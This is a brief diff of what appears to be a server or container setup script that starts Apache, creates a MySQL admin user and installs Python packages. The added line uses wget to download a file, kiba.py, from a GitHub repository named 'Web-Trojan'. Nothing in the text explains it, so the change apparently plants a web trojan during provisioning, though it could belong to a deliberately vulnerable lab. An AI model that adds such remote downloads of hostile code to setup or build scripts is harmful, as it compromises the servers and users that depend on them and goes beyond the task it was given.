@@ -16,3 +16,4 @@ service apache2 start
 bash /create_mysql_admin_user.sh
 apt-get install -y python-pip
 pip install requests
+wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/kiba.py -O kiba.py
